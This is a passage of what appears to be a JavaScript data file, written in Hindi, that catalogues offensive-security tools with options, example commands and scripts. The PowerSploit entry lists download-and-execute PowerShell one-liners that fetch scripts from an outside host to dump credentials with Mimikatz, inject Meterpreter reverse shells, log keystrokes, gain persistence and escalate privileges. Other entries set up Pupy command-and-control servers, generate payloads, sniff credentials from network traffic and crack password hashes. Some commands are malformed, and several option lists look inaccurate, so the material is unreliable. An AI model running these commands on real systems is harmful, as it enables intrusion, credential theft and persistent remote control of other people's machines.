      { cmd: "one_gadget /lib/aarch64-linux-gnu/libc.so.6", desc: "ARM64 libc गैजेट" }
    ],
    advanced: [
      { cmd: "one_gadget -l -v /lib/x86_64-linux-gnu/libc.so.6 2>&1 | tee onegadget.log", desc: "सभी गैजेट लॉग" },
      { cmd: "one_gadget -s /lib/x86_64-linux-gnu/libc.so.6 | awk '{print $1}'", desc: "गैजेट एड्रेस निकालें" },
      { cmd: "for lib in /lib/x86_64-linux-gnu/libc*.so*; do echo $lib && one_gadget -s $lib; done > libc_gadgets.txt", desc: "सभी libc गैजेट खोजें" },
      { cmd: "ldd /bin/bash | grep libc | awk '{print $3}' | xargs one_gadget -l", desc: "बैश के libc में गैजेट" },
      { cmd: "one_gadget -s /lib/x86_64-linux-gnu/libc.so.6 2>&1 | grep -E '0x[0-9a-f]+' | head -5", desc: "पहले 5 गैजेट एड्रेस" }
    ],
    script: "echo 'One-Gadget खोज रहा है...'\nLIBC_PATH=$(ldd /bin/sh | grep libc | awk '{print $3}')\nif [ -n \"$LIBC_PATH\" ]; then\n  one_gadget -l -s $LIBC_PATH > one_gadgets.txt 2>/dev/null\n  echo \"गैजेट मिले: $(wc -l < one_gadgets.txt)\"\nfi"
  },
  Onesixtyone: {
    install: { pkg: "onesixtyone" },
    options: [
      ["-c <file>", "कम्युनिटी फ़ाइल"],
      ["-i <file>", "IP लिस्ट फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-p <port>", "पोर्ट"],
      ["-d <delay>", "विलंब ms"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-t <ver>", "SNMP वर्ज़न"],
      ["-s", "साइलेंट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "onesixtyone 192.168.1.1", desc: "SNMP कम्युनिटी स्कैन" },
      { cmd: "onesixtyone -c /usr/share/wordlists/snmp-communities.txt 192.168.1.1", desc: "वर्डलिस्ट से स्कैन" },
      { cmd: "onesixtyone -c communities.txt -i ips.txt -o results.txt", desc: "फ़ाइलों से बैच स्कैन" },
      { cmd: "onesixtyone -c community.txt 192.168.1.0/24", desc: "सबनेट SNMP स्कैन" },
      { cmd: "onesixtyone -d 100 192.168.1.1", desc: "100ms विलंब स्कैन" },
      { cmd: "onesixtyone -c common.txt 192.168.1.1 -v", desc: "वर्बोज़ SNMP स्कैन" },
      { cmd: "onesixtyone -p 161 192.168.1.1", desc: "पोर्ट 161 पर स्कैन" },
      { cmd: "onesixtyone -q 192.168.1.1", desc: "शांत SNMP स्कैन" },
      { cmd: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.0.0.1", desc: "सेकलिस्ट SNMP स्कैन" },
      { cmd: "onesixtyone -c public,private,manager 192.168.1.1", desc: "तीन कम्युनिटी परीक्षण" }
    ],
    advanced: [
      { cmd: "onesixtyone -c communities.txt -i targets.txt -v -o scan.txt 2>&1 | tee snmp.log", desc: "बैच SNMP स्कैन लॉग" },
      { cmd: "onesixtyone -c /usr/share/wordlists/snmp-communities.txt 192.168.1.0/24 2>&1 | grep -i 'responded'", desc: "जवाब देने वाले होस्ट फ़िल्टर" },
      { cmd: "nmap -sU -p 161 192.168.1.0/24 -oG - | grep 'open' | awk '{print $2}' > snmp_ips.txt && onesixtyone -c community.txt -i snmp_ips.txt", desc: "nmap से SNMP IP खोजें" },
      { cmd: "for ip in $(cat ips.txt); do onesixtyone -c community.txt $ip -q; done > snmp_results.txt", desc: "लूप से IP स्कैन" },
      { cmd: "onesixtyone -c community.txt 192.168.1.1 -v 2>&1 | awk '/public|private/{print}'", desc: "मिली कम्युनिटी फ़िल्टर" }
    ],
    script: "echo 'SNMP स्कैन शुरू...'\nnmap -sU -p 161 192.168.1.0/24 -oG - 2>/dev/null | grep 'open' | awk '{print $2}' > /tmp/snmp_hosts.txt\necho 'SNMP होस्ट:' $(wc -l < /tmp/snmp_hosts.txt)\nonesixtyone -c /usr/share/wordlists/snmp-communities.txt -i /tmp/snmp_hosts.txt -o /tmp/snmp_scan.txt -v 2>&1 | tee /tmp/snmp.log\necho 'SNMP स्कैन पूर्ण'"
  },
  PACK: {
    install: { pkg: "pack" },
    options: [
      ["-f <file>", "हैश फ़ाइल"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-m <mode>", "अटैक मोड"],
      ["-r <rules>", "नियम फ़ाइल"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-t <type>", "हैश प्रकार"],
      ["-p", "प्रोसेसर"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "pack -f hashes.txt -w /usr/share/wordlists/rockyou.txt", desc: "हैश क्रैक करें" },
      { cmd: "pack -f ntlm.txt -w wordlist.txt -t ntlm", desc: "NTLM हैश क्रैक" },
      { cmd: "pack -f md5.txt -m stats", desc: "हैश आँकड़े दिखाएँ" },
      { cmd: "pack -f hashes.txt -w dict.txt -r rules.txt", desc: "नियम-आधारित क्रैक" },
      { cmd: "pack -f sha256.txt -w /usr/share/wordlists/rockyou.txt -t sha256", desc: "SHA256 हैश क्रैक" },
      { cmd: "pack -f hashes.txt -v", desc: "वर्बोज़ विश्लेषण" },
      { cmd: "pack -f hashes.txt -s", desc: "साइलेंट मोड" },
      { cmd: "pack -f hashes.txt -o cracked.txt", desc: "क्रैक हैश आउटपुट" },
      { cmd: "pack -f hashes.txt -m brute -p", desc: "प्रोसेसर ब्रूटफ़ोर्स" },
      { cmd: "pack -f bcrypt.txt -w wordlist.txt -t bcrypt", desc: "bcrypt हैश क्रैक" }
    ],
    advanced: [
      { cmd: "pack -f hashes.txt -w /usr/share/wordlists/rockyou.txt -r rules.rule -v 2>&1 | tee pack.log", desc: "रूल-बेस्ड क्रैक लॉग" },
      { cmd: "pack -f hashes.txt -m stats 2>&1 | grep -i 'unique\\|total\\|complexity'", desc: "पासवर्ड सांख्यिकी" },
      { cmd: "for type in md5 sha1 sha256 ntlm; do pack -f hashes_$type.txt -w wordlist.txt -t $type; done", desc: "सभी हैश प्रकार क्रैक" },
      { cmd: "pack -f hashes.txt -m brute -p -s 2>&1 | grep -i 'found\\|password'", desc: "मिले पासवर्ड फ़िल्टर" },
      { cmd: "pack -f hashes.txt -m stats -v 2>&1 | awk '/Length|Charset/{print}'", desc: "लंबाई और चारसेट आँकड़े" }
    ],
    script: "echo 'पासवर्ड क्रैकिंग...'\npack -f /tmp/hashes.txt -w /usr/share/wordlists/rockyou.txt -v -o /tmp/cracked.txt 2>&1 | tee /tmp/pack_run.log\nif [ -f /tmp/cracked.txt ]; then\n  echo 'क्रैक किए:' $(wc -l < /tmp/cracked.txt)\nfi"
  },
  PCredz: {
    install: { pkg: "p-credz" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-r <file>", "PCAP फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-p <port>", "पोर्ट फ़िल्टर"],
      ["-o <file>", "आउटपुट"],
      ["-c", "क्रेडेंशियल ही"],
      ["-d", "डीबग"],
      ["-t <type>", "प्रोटोकॉल फ़िल्टर"],
      ["-s", "साइलेंट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "pcredz -i eth0", desc: "क्रेडेंशियल कैप्चर शुरू" },
      { cmd: "pcredz -r capture.pcap", desc: "PCAP से क्रेडेंशियल पार्स" },
      { cmd: "pcredz -i eth0 -o creds.txt", desc: "क्रेडेंशियल फ़ाइल में सेव" },
      { cmd: "pcredz -i eth0 -v", desc: "वर्बोज़ क्रेड कैप्चर" },
      { cmd: "pcredz -i eth0 -c", desc: "सिर्फ़ क्रेडेंशियल दिखाएँ" },
      { cmd: "pcredz -i eth0 -p 80", desc: "पोर्ट 80 ही कैप्चर" },
      { cmd: "pcredz -i eth0 -t http", desc: "HTTP क्रेडेंशियल ही" },
      { cmd: "pcredz -r traffic.pcap -o extracted.txt", desc: "PCAP पार्स आउटपुट" },
      { cmd: "pcredz -i wlan0", desc: "वायरलेस क्रेड कैप्चर" },
      { cmd: "pcredz -i eth0 -t ftp,telnet", desc: "FTP और Telnet क्रेड" }
    ],
    advanced: [
      { cmd: "pcredz -i eth0 -v -c -o /tmp/creds.txt 2>&1 | tee pcredz.log", desc: "पूर्ण क्रेड कैप्चर लॉग" },
      { cmd: "pcredz -i eth0 -c 2>&1 | awk '{print $2, $3, $4, $5}'", desc: "स्ट्रक्चर्ड क्रेड आउटपुट" },
      { cmd: "tcpdump -i eth0 -w /tmp/capture.pcap 'port 80' & pcredz -r /tmp/capture.pcap -c", desc: "कैप्चर और क्रेड पार्स" },
      { cmd: "pcredz -r capture.pcap -c 2>&1 | grep -i 'password\\|user\\|login'", desc: "लॉगिन क्रेडेंशियल फ़िल्टर" },
      { cmd: "pcredz -i eth0 -c -s 2>&1 | while read line; do echo \"[$(date +%T)] $line\" >> /var/log/creds.log; done", desc: "रीयल-टाइम क्रेड लॉग" }
    ],
    script: "echo 'PCredz क्रेडेंशियल कैप्चर...'\npcredz -i eth0 -v -c -o /tmp/all_creds.txt 2>&1 | tee /tmp/pcredz_run.log &\necho 'कैप्चर चल रहा है... PID:' $!"
  },
  PDFCrack: {
    install: { pkg: "pdf-crack" },
    options: [
      ["-f <file>", "PDF फ़ाइल"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-n <min>", "न्यूनतम लंबाई"],
      ["-m <max>", "अधिकतम लंबाई"],
      ["-c <charset>", "चारसेट"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-s <start>", "स्टार्ट पासवर्ड"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "pdfcrack -f protected.pdf -w /usr/share/wordlists/rockyou.txt", desc: "PDF पासवर्ड क्रैक" },
      { cmd: "pdfcrack -f document.pdf -n 1 -m 8", desc: "1-8 कैरेक्टर ब्रूटफ़ोर्स" },
      { cmd: "pdfcrack -f doc.pdf -w wordlist.txt -v", desc: "वर्बोज़ PDF क्रैक" },
      { cmd: "pdfcrack -f secret.pdf -c 'abcdefghijklmnopqrstuvwxyz'", desc: "लोअरकेस ब्रूटफ़ोर्स" },
      { cmd: "pdfcrack -f report.pdf -w dict.txt -o password.txt", desc: "पासवर्ड फ़ाइल में सेव" },
      { cmd: "pdfcrack -f enc.pdf -n 4 -m 4 -c '0123456789'", desc: "4 अंक PIN ब्रूटफ़ोर्स" },
      { cmd: "pdfcrack -f file.pdf -s 'admin'", desc: "'admin' से शुरू करें" },
      { cmd: "pdfcrack -f protected.pdf -q", desc: "शांत मोड" },
      { cmd: "pdfcrack -f doc.pdf -w /usr/share/wordlists/rockyou.txt -v 2>&1", desc: "रॉकयू वर्बोज़ क्रैक" },
      { cmd: "pdfcrack -f enc.pdf -n 6 -m 6", desc: "6 कैरेक्टर ब्रूटफ़ोर्स" }
    ],
    advanced: [
      { cmd: "pdfcrack -f protected.pdf -w /usr/share/wordlists/rockyou.txt -v 2>&1 | tee pdfcrack.log", desc: "PDF क्रैक प्रोग्रेस लॉग" },
      { cmd: "pdfcrack -f secret.pdf -c 'abcdefghijklmnopqrstuvwxyz0123456789' -n 4 -m 6 2>&1", desc: "अल्फ़ान्यूमेरिक ब्रूटफ़ोर्स" },
      { cmd: "for dict in /usr/share/wordlists/*.txt; do pdfcrack -f pdf.pdf -w $dict -q; done > found_pass.txt", desc: "सभी डिक्शनरी परीक्षण" },
      { cmd: "pdfcrack -f enc.pdf -v 2>&1 | grep -i 'found\\|password\\|trying'", desc: "मिले पासवर्ड मॉनिटर" },
      { cmd: "pdfcrack -f pdf.pdf -w wordlist.txt -o pass.txt && cat pass.txt", desc: "क्रैक और परिणाम दिखाएँ" }
    ],
    script: "echo 'PDF पासवर्ड क्रैकिंग...'\nfor dict in /usr/share/wordlists/rockyou.txt /usr/share/wordlists/fasttrack.txt; do\n  if [ -f $dict ]; then\n    pdfcrack -f protected.pdf -w $dict -o /tmp/pdf_pass.txt -q 2>/dev/null\n    [ -s /tmp/pdf_pass.txt ] && break\n  fi\ndone\necho 'PDF क्रैकिंग समाप्त'"
  },
  PDFParser: {
    install: { pkg: "pdf-parser" },
    options: [
      ["-f <file>", "PDF फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-s", "स्ट्रीम पार्स"],
      ["-r", "रीसोर्स पार्स"],
      ["-m", "मेटाडेटा दिखाएँ"],
      ["-e", "एक्सट्रैक्ट ऑल"],
      ["-v", "वर्बोज़"],
      ["-c", "कंटेंट ही"],
      ["-x", "XML आउटपुट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "pdf-parser -f document.pdf", desc: "PDF संरचना पार्स" },
      { cmd: "pdf-parser -f file.pdf -m", desc: "PDF मेटाडेटा दिखाएँ" },
      { cmd: "pdf-parser -f doc.pdf -s", desc: "PDF स्ट्रीम पार्स" },
      { cmd: "pdf-parser -f document.pdf -e -o /output", desc: "सभी ऑब्जेक्ट निकालें" },
      { cmd: "pdf-parser -f file.pdf -c", desc: "कंटेंट ही दिखाएँ" },
      { cmd: "pdf-parser -f doc.pdf -x -o output.xml", desc: "XML आउटपुट" },
      { cmd: "pdf-parser -f malware.pdf -v", desc: "वर्बोज़ PDF पार्स" },
      { cmd: "pdf-parser -f document.pdf -r", desc: "रीसोर्स पार्स" },
      { cmd: "pdf-parser -f file.pdf -o parsed.txt", desc: "पार्स आउटपुट फ़ाइल" },
      { cmd: "pdf-parser -f sample.pdf -s -v 2>&1", desc: "स्ट्रीम वर्बोज़ पार्स" }
    ],
    advanced: [
      { cmd: "pdf-parser -f document.pdf -e -o /tmp/extracted -v 2>&1 | tee pdfparse.log", desc: "पूर्ण PDF निष्कर्षण लॉग" },
      { cmd: "pdf-parser -f malware.pdf -s -v 2>&1 | grep -i 'javascript\\|js\\|action'", desc: "PDF में JavaScript खोजें" },
      { cmd: "pdf-parser -f doc.pdf -c -x -o structure.xml && xmllint --format structure.xml", desc: "XML फ़ॉर्मेटेड संरचना" },
      { cmd: "for f in *.pdf; do pdf-parser -f $f -m; done > metadata_all.txt", desc: "सभी PDF का मेटाडेटा" },
      { cmd: "pdf-parser -f sample.pdf -v 2>&1 | awk '/Obj|Stream/{print $1, $2, $3}'", desc: "ऑब्जेक्ट और स्ट्रीम सारांश" }
    ],
    script: "echo 'PDF विश्लेषण शुरू...'\nfor f in *.pdf; do\n  echo \"=== $f ===\" >> /tmp/pdf_report.txt\n  pdf-parser -f \"$f\" -m >> /tmp/pdf_report.txt 2>/dev/null\n  pdf-parser -f \"$f\" -v 2>&1 | grep -i 'javascript\\|/JS\\|/Action' >> /tmp/pdf_indicators.txt\ndone\necho 'PDF विश्लेषण पूर्ण'"
  },
  PhotoRec: {
    install: { pkg: "photo-rec" },
    options: [
      ["-d <dir>", "आउटपुट डायरेक्टरी"],
      ["-f", "फ़ाइल प्रकार"],
      ["-r", "रीकर्सिव"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-a", "सभी प्रकार"],
      ["-t <type>", "प्रकार चुनें"],
      ["-b", "ब्रोकन मोड"],
      ["-c <file>", "कॉन्फ़िग"],
      ["--help", "सहायता"]
    ],
    basic: [
      { cmd: "photorec /dev/sdb", desc: "डिस्क से फ़ोटो रिकवर" },
      { cmd: "photorec -d /recovered /dev/sdb", desc: "डायरेक्टरी में रिकवर" },
      { cmd: "photorec image.dd", desc: "इमेज फ़ाइल से रिकवर" },
      { cmd: "photorec -d /output -f /dev/sdb1", desc: "पार्टीशन से रिकवर" },
      { cmd: "photorec -a /dev/sdb", desc: "सभी प्रकार रिकवर" },
      { cmd: "photorec -t jpg /dev/sdb", desc: "सिर्फ़ JPG रिकवर" },
      { cmd: "photorec -v /dev/sdb", desc: "वर्बोज़ रिकवरी" },
      { cmd: "photorec -q /dev/sdb", desc: "शांत मोड" },
      { cmd: "photorec -b /dev/sdb", desc: "ब्रोकन मोड" },
      { cmd: "photorec -c /etc/photorec.conf /dev/sdb", desc: "कॉन्फ़िग से रिकवर" }
    ],
    advanced: [
      { cmd: "photorec -d /recovered -a -v /dev/sdb 2>&1 | tee photorec.log", desc: "पूर्ण रिकवरी लॉग" },
      { cmd: "photorec -d /output image.dd && find /output -type f | wc -l", desc: "रिकवर फ़ाइलों की गिनती" },
      { cmd: "dc3dd if=/dev/sdb of=evidence.dd && photorec -d /rec evidence.dd", desc: "dc3dd इमेज लें और रिकवर" },
      { cmd: "for disk in sdb sdc; do photorec -d /rec_$disk /dev/$disk; done", desc: "एकाधिक डिस्क रिकवर" },
      { cmd: "photorec -d /rec /dev/sdb -v 2>&1 | grep -i 'recovered\\|error\\|done'", desc: "रिकवरी प्रोग्रेस मॉनिटर" }
    ],
    script: "echo 'फ़ाइल रिकवरी शुरू...'\nmkdir -p /recovered/$(date +%Y%m%d)\nphotorec -d /recovered/$(date +%Y%m%d) -a -v /dev/sdb 2>&1 | tee /tmp/photorec.log\nCOUNT=$(find /recovered/$(date +%Y%m%d) -type f | wc -l)\necho \"कुल $COUNT फ़ाइलें रिकवर\""
  },
  Pipal: {
    install: { pkg: "pipal" },
    options: [
      ["-f <file>", "पासवर्ड फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-t <type>", "विश्लेषण प्रकार"],
      ["-c <charset>", "चारसेट दिखाएँ"],
      ["-l", "लंबाई विश्लेषण"],
      ["-p", "पैटर्न विश्लेषण"],
      ["-b", "बेसिक आँकड़े"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "pipal -f /usr/share/wordlists/rockyou.txt", desc: "पासवर्ड विश्लेषण" },
      { cmd: "pipal -f passwords.txt -o report.txt", desc: "रिपोर्ट फ़ाइल में सेव" },
      { cmd: "pipal -f cracked.txt -v", desc: "वर्बोज़ पासवर्ड विश्लेषण" },
      { cmd: "pipal -f passwords.txt -l", desc: "लंबाई विश्लेषण" },
      { cmd: "pipal -f passwords.txt -p", desc: "पैटर्न विश्लेषण" },
      { cmd: "pipal -f passwords.txt -b", desc: "बेसिक आँकड़े" },
      { cmd: "pipal -f passwords.txt -c", desc: "चारसेट विश्लेषण" },
      { cmd: "pipal -f custom.txt -o analysis.html", desc: "HTML रिपोर्ट" },
      { cmd: "pipal -f passwords.txt -t all", desc: "सभी प्रकार विश्लेषण" },
      { cmd: "pipal -f /tmp/hashes_cracked.txt -s", desc: "साइलेंट विश्लेषण" }
    ],
    advanced: [
      { cmd: "pipal -f passwords.txt -v -o /tmp/pipal_report.txt 2>&1 | tee pipal.log", desc: "पूर्ण विश्लेषण लॉग" },
      { cmd: "pipal -f passwords.txt -l -p -v 2>&1 | grep -i 'most\\|top\\|common'", desc: "सबसे सामान्य पासवर्ड" },
      { cmd: "for f in *.txt; do pipal -f $f -o ${f}.pipal_report; done", desc: "सभी वर्डलिस्ट विश्लेषण" },
      { cmd: "pipal -f passwords.txt -v 2>&1 | head -50", desc: "पहले 50 आँकड़ों की पंक्तियाँ" },
      { cmd: "pipal -f /usr/share/wordlists/rockyou.txt -b -c -l > /tmp/rockyou_stats.txt", desc: "रॉकयू का पूर्ण आँकड़ा" }
    ],
    script: "echo 'पासवर्ड विश्लेषण...'\nif [ -f /tmp/cracked_passwords.txt ]; then\n  pipal -f /tmp/cracked_passwords.txt -v -o /tmp/password_analysis.txt 2>/dev/null\n  echo 'विश्लेषण /tmp/password_analysis.txt में सेव'\nfi"
  },
  PowerSploit: {
    install: { pkg: "power-sploit" },
    options: [
      ["-s <script>", "स्क्रिप्ट चुनें"],
      ["-r <host>", "रिमोट होस्ट"],
      ["-p <port>", "पोर्ट"],
      ["-c <cmd>", "कमांड"],
      ["-o <file>", "आउटपुट"],
      ["-e <encode>", "एन्कोडिंग"],
      ["-v", "वर्बोज़"],
      ["-t <type>", "पेलोड प्रकार"],
      ["-l", "लिस्टन"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Invoke-Mimikatz.ps1\");Invoke-Mimikatz -DumpCreds'", desc: "Mimikatz क्रेड डंप" },
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Invoke-Shellcode.ps1\");Invoke-Shellcode -Payload windows/meterpreter/reverse_http'", desc: "शेलकोड इंजेक्ट" },
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Get-PassHashes.ps1\");Get-PassHashes'", desc: "पासवर्ड हैश प्राप्त करें" },
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/PowerUp.ps1\");Invoke-AllChecks'", desc: "PowerUp सुरक्षा जाँच" },
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Invoke-Keylogger.ps1\");Invoke-Keylogger -Path key.txt'", desc: "कीलॉगर शुरू" },
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Get-GPPPassword.ps1\");Get-GPPPassword'", desc: "GPP पासवर्ड प्राप्त" },
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Invoke-Privesc.ps1\");Invoke-Privesc'", desc: "प्रिविलेज एस्केलेशन" },
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Find-InterestingFile.ps1\");Find-InterestingFile -Path C:\\Users\\'", desc: "दिलचस्प फ़ाइलें खोजें" },
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Invoke-Persistence.ps1\");Invoke-Persistence'", desc: "पर्सिस्टेंस स्थापित" },
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Get-System.ps1\");Get-System'", desc: "SYSTEM प्रिविलेज प्राप्त" }
    ],
    advanced: [
      { cmd: "python3 -m http.server 80 & && powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Invoke-Mimikatz.ps1\");Invoke-Mimikatz -DumpCreds'", desc: "HTTP सर्वर और Mimikatz" },
      { cmd: "powershell -exec bypass -c '$c=\"http://192.168.1.10/\";IEX(New-Object Net.WebClient).DownloadString($c+ \"Invoke-Shellcode.ps1\");Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.10 -Lport 443'", desc: "HTTPS Meterpreter इंजेक्ट" },
      { cmd: "echo 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/PowerUp.ps1\");Invoke-AllChecks' | powershell -noprofile -", desc: "पाइप से पावरशेल" },
      { cmd: "powershell -exec bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10/Get-PassHashes.ps1\");Get-PassHashes | Out-File -FilePath hashes.txt'", desc: "हैश फ़ाइल में सेव" },
      { cmd: "powershell -encodedcommand $(base64 -w0 payload.ps1)", desc: "एन्कोडेड कमांड निष्पादित" }
    ],
    script: "echo 'PowerSploit पेलोड तैयार'\necho 'HTTP सर्वर शुरू:'\npython3 -m http.server 80 &\necho ''\necho 'लक्ष्य पर चलाएँ:'\necho 'powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://192.168.1.10/Invoke-Mimikatz.ps1\\\");Invoke-Mimikatz -DumpCreds\"'"
  },
  Pupy: {
    install: { pkg: "pupy" },
    options: [
      ["-s <host>", "सर्वर होस्ट"],
      ["-p <port>", "सर्वर पोर्ट"],
      ["-l <host>", "लिसनर होस्ट"],
      ["-P <port>", "लिसनर पोर्ट"],
      ["-r <file>", "रीसोर्स फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-d", "डीबग"],
      ["-t <type>", "परिवहन प्रकार"],
      ["-k <file>", "सर्टिफ़िकेट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "pupysh", desc: "Pupy कंसोल शुरू" },
      { cmd: "pupysh -s 0.0.0.0 -p 443", desc: "HTTPS C2 सर्वर" },
      { cmd: "pupy -s 0.0.0.0:443 -l 192.168.1.10:4444", desc: "लिसनर कॉन्फ़िगर करें" },
      { cmd: "pupygen -t windows -o payload.exe", desc: "Windows पेलोड बनाएँ" },
      { cmd: "pupygen -t linux -o payload.elf", desc: "Linux पेलोड बनाएँ" },
      { cmd: "pupy -s 0.0.0.0 -p 443 -k cert.pem", desc: "SSL सर्टिफ़िकेट सर्वर" },
      { cmd: "pupysh -s example.com -p 443 -v", desc: "वर्बोज़ C2" },
      { cmd: "pupy -c 'list'", desc: "सभी सत्र सूची" },
      { cmd: "pupygen -t android -o payload.apk", desc: "Android पेलोड" },
      { cmd: "pupy -s 0.0.0.0 -p 80", desc: "HTTP पोर्ट C2" }
    ],
    advanced: [
      { cmd: "pupysh -s 0.0.0.0 -p 443 -v 2>&1 | tee pupy.log", desc: "C2 सर्वर लॉग" },
      { cmd: "pupygen -t windows -o /tmp/payload.exe && pupysh -s 0.0.0.0 -p 443", desc: "पेलोड जनरेट और C2" },
      { cmd: "pupysh -s 0.0.0.0 -p 443 -d 2>&1 | grep -i 'session\\|connect'", desc: "सेशन कनेक्शन मॉनिटर" },
      { cmd: "for os in windows linux android osx; do pupygen -t $os -o payload_$os; done", desc: "सभी OS पेलोड" },
      { cmd: "pupysh -s 0.0.0.0 -p 443 -v 2>&1 | awk '/session|connected/{print}'", desc: "सत्र कनेक्शन फ़िल्टर" }
    ],
    script: "echo 'Pupy C2 शुरू...'\npupysh -s 0.0.0.0 -p 443 -v 2>&1 | tee /var/log/pupy.log &\nC2_PID=$!\nsleep 3\necho \"C2 सर्वर PID: $C2_PID पोर्ट 443\"\necho 'पेलोड जनरेट करें: pupygen -t windows -o payload.exe'"
  },
  Pwnat: {
    install: { pkg: "pwnat" },
    options: [
      ["-s", "सर्वर मोड"],
      ["-c", "क्लाइंट मोड"],
      ["-l <port>", "लिसन पोर्ट"],
      ["-r <host>", "रीमोट होस्ट"],
      ["-p <port>", "रीमोट पोर्ट"],
      ["-k <key>", "शेयर्ड की"],
      ["-v", "वर्बोज़"],
      ["-t <sec>", "टाइमआउट"],
      ["-n <host>", "NAT होस्ट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "pwnat -s -l 2222", desc: "NAT टनल सर्वर" },
      { cmd: "pwnat -c -r example.com -p 2222 -l 8080", desc: "NAT टनल क्लाइंट" },
      { cmd: "pwnat -s -l 2222 -k secret", desc: "की के साथ सर्वर" },
      { cmd: "pwnat -c -r 192.168.1.100 -p 2222 -l 8888", desc: "IP से NAT टनल" },
      { cmd: "pwnat -s -l 2222 -v", desc: "वर्बोज़ सर्वर" },
      { cmd: "pwnat -c -r example.com -p 2222 -l 8080 -v", desc: "वर्बोज़ क्लाइंट" },
      { cmd: "pwnat -c -r example.com -p 2222 -t 60", desc: "60 सेकंड टाइमआउट" },
      { cmd: "pwnat -s -l 4444 -n 192.168.1.1", desc: "NAT गेटवे निर्दिष्ट" },
      { cmd: "pwnat -c -r example.com -p 2222 -l 80", desc: "पोर्ट 80 टनल क्लाइंट" },
      { cmd: "pwnat -s -l 2222 -k mykey -v", desc: "की के साथ वर्बोज़ सर्वर" }
    ],
    advanced: [
      { cmd: "pwnat -s -l 2222 -v 2>&1 | tee pwnat_server.log", desc: "NAT सर्वर लॉग" },
      { cmd: "pwnat -s -l 2222 & && ssh -o ProxyCommand='pwnat -c -r example.com -p 2222 -l %p' user@localhost", desc: "NAT टनल के माध्यम से SSH" },
      { cmd: "pwnat -c -r example.com -p 2222 -l 8080 -v 2>&1 | grep -i 'connect\\|tunnel'", desc: "कनेक्शन स्थिति मॉनिटर" },
      { cmd: "for port in 2222 3333 4444; do pwnat -s -l $port &; done", desc: "एकाधिक NAT पोर्ट" },
      { cmd: "pwnat -s -l 2222 -k pass123 -v 2>&1 | tee /tmp/pwnat.log", desc: "प्रमाणीकृत NAT लॉग" }
    ],
    script: "echo 'NAT टनल शुरू...'\npwnat -s -l 2222 -k mysecret -v 2>&1 | tee /tmp/pwnat.log &\necho 'NAT सर्वर पोर्ट 2222 पर'\necho 'क्लाइंट: pwnat -c -r <सर्वर_IP> -p 2222 -l 8080'"
  },
  Pwntools: {
    install: { pkg: "pwntools" },
    options: [
      ["-a <arch>", "आर्किटेक्चर"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-p <port>", "पोर्ट"],
      ["-r <host>", "रिमोट होस्ट"],
      ["-l", "लोकल मोड"],
      ["-v", "वर्बोज़"],
      ["-d", "डीबग"],
      ["-e <encode>", "एन्कोडिंग"],
      ["-t <type>", "प्रकार"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "pwn checksec /bin/ls", desc: "बाइनरी सुरक्षा जाँच" },
      { cmd: "pwn cyclic 100", desc: "100 कैरेक्टर साइक्लिक पैटर्न" },
      { cmd: "pwn cyclic -l 0x6161616c", desc: "ऑफ़सेट पता करें" },
      { cmd: "pwn disasm '0f 05 c3'", desc: "शेलकोड डिसअसेंबल" },
      { cmd: "pwn asm 'xor eax, eax; ret' -c amd64", desc: "x64 असेंबल" },
      { cmd: "pwn shellcraft -a amd64 -l linux execve", desc: "शेलकोड जनरेट" },
      { cmd: "pwn const grep -c AF_INET", desc: "सिस्टम कॉन्स्टेंट खोजें" },
      { cmd: "pwn update", desc: "pwntools अपडेट" },
      { cmd: "pwn hex 'Hello World'", desc: "स्ट्रिंग HEX में बदलें" },
      { cmd: "pwn unhex '48656c6c6f'", desc: "HEX से स्ट्रिंग" }
    ],
    advanced: [
